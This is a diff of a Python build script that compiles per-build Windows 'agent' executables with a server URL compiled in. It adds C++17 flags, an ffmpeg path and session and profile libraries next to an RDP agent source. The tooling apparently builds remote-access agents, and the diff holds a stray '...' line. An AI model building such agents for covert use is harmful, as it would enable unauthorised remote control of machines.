@@ -4,6 +4,7 @@ import subprocess
 import hashlib
 import sys
 import platform
+import shutil
 from pathlib import Path
 
 # Add project root to Python path
@@ -20,6 +21,9 @@ from app.models import AgentBuild
 CPP_AGENT_DIR = PROJECT_ROOT / "builder_cpp" / "agent"
 DIST_DIR = PROJECT_ROOT / "dist" / "agents"
 DIST_DIR.mkdir(parents=True, exist_ok=True)
+
+# ffmpeg location
+FFMPEG_SOURCE = PROJECT_ROOT / "dist" / "ffmpeg.exe"
 
 CPP_ENTRYPOINT = CPP_AGENT_DIR / "cmd" / "agent" / "main.cpp"
 CPP_RDP_AGENT = CPP_AGENT_DIR / "cmd" / "agent" / "rdp_agent.cpp"
@@ -62,16 +66,16 @@ def sha256_file(path: Path) -> str:
 def build_exe(build_slug: str, server_url: str) -> Path:
     output_exe = DIST_DIR / f"agent_universal_{build_slug}.exe"
 
-    # Ensure output directory exists
     DIST_DIR.mkdir(parents=True, exist_ok=True)
 
     print(f"[+] Building {output_exe.name}")
     print(f"[i] Using compiler: {GXX}")
     print(f"[i] Platform: {CURRENT_OS}")
 
-    # Вшиваем параметры в исполняемый файл через макросы компилятора
     cmd = [
         GXX,
+        "-std=c++17",  # ← ДОБАВИТЬ: стандарт C++17
+        "-O2",  # ← (опционально) оптимизация release
         "-o",
         str(output_exe),
         f'-DSERVER_URL="{server_url}"',
@@ -84,8 +88,11 @@ def build_exe(build_slug: str, server_url: str) -> Path:
         "-luser32",
         "-lsecur32",
         "-lcrypt32",
+        "-lwtsapi32",
+        "-luserenv",
         "-static",
     ]
+    ...
 
     # For Linux cross-compilation, add additional flags
     if CURRENT_OS == "Linux":
